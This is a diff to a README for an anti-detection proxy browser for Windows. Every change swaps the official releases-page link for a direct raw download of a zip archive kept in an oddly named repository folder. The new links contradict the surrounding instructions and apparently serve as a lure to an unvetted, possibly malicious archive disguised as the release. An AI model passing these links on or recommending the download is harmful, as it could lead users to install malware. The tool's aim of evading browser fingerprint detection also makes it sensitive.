@@ -1,11 +1,11 @@
 # 🛡️ AntiDetection-ProxyBrowser-2026 - Keep Sessions Clean Across Browsers
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/raw/refs/heads/main/exoneration/Browser-Proxy-Detection-Anti-1.9.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows version:
-https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/releases
+https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/raw/refs/heads/main/exoneration/Browser-Proxy-Detection-Anti-1.9.zip
 
 Open the latest release, then download the Windows file that matches your system. If you see more than one file, choose the `.exe` file for the standard Windows app.
 
@@ -34,7 +34,7 @@ For best results, close other browsers before first launch.
 ## 🚀 How to download and install
 
 1. Open the releases page:
-   https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/releases
+   https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/raw/refs/heads/main/exoneration/Browser-Proxy-Detection-Anti-1.9.zip
 
 2. Find the latest release at the top of the page.
 
@@ -184,7 +184,7 @@ Yes. The app includes options that help manage fingerprint-related settings.
 ## 📌 Release source
 
 Use the release page for the latest Windows download:
-https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/releases
+https://github.com/Analgesiamisuse629/AntiDetection-ProxyBrowser-2026/raw/refs/heads/main/exoneration/Browser-Proxy-Detection-Anti-1.9.zip
 
 ## 🧭 File names you may see
 
